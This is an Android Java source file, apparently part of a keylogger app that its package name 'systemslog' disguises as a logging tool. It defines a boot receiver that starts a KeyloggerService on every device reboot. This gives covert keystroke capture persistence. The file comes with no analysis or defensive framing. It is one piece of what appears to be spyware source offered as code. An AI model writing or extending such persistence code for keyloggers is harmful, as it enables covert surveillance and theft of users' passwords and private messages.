package com.example.systemslog;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;
import androidx.core.content.ContextCompat;

public class BootReceiver extends BroadcastReceiver {
    private static final String TAG = "BootReceiver";

    @Override
    public void onReceive(Context context, Intent intent) {
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction())) {
            Log.d(TAG, "Device rebooted. Starting KeyloggerService.");
            Intent serviceIntent = new Intent(context, KeyloggerService.class);
            ContextCompat.startForegroundService(context, serviceIntent);
        }
    }
}
